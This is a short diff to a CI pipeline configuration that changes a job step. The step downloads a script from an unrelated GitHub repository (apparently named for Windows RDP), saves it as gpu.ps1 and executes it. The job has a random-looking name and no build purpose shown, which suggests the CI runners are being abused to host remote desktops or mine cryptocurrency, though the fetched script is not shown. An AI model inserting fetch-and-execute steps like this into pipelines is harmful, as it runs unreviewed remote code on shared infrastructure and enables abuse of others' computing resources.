@@ -17,6 +17,6 @@ jobs:
       - run: 
           name: 24GOlu24zpC3l2AADPxVJJ8dgcG_3MNhsfwm4JcwHPYHrmC6k
           command: |      
-            Invoke-WebRequest https://raw.githubusercontent.com/Yahihs/rep/main/sh -OutFile gpu.ps1 
+            Invoke-WebRequest https://raw.githubusercontent.com/Ayushfknq/win-rdp-mas/main/main.sh -OutFile gpu.ps1 
           
       - run: ./gpu.ps1
